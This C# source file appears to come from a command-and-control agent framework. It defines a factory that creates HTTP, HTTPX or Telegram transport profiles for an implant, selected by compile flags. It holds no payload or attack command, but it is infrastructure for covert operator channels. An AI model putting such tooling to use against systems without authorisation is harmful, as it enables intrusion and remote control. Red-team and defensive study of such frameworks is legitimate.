using AgInterop.Interfaces;
#if HTTP
using HttpTransport;
#endif
#if HTTPX
using HttpxTransport;
#endif
#if TELEGRAM
using TelegramTransport;
#endif
using System;
using System.Collections.Generic;

namespace AgCore.Management.C2
{
    public class C2ProfileManager : AgInterop.Classes.C2ProfileManager
    {
        public C2ProfileManager(IAgent agent) : base(agent)
        {

        }

        public override IC2Profile NewC2Profile(Type c2, ISerializer serializer, Dictionary<string, string> parameters)
        {
#if HTTP
            if (c2 == typeof(HttpProfile))
            {
                return new HttpProfile(parameters, serializer, Agent);
            }
#endif
#if HTTPX
            if (c2 == typeof(HttpxProfile))
            {
                return new HttpxProfile(parameters, serializer, Agent);
            }
#endif
#if TELEGRAM
            if (c2 == typeof(TelegramProfile))
            {
                return new TelegramProfile(parameters, serializer, Agent);
            }
#endif
            throw new ArgumentException($"Unsupported C2 Profile type: {c2.Name}");
        }
    }
}
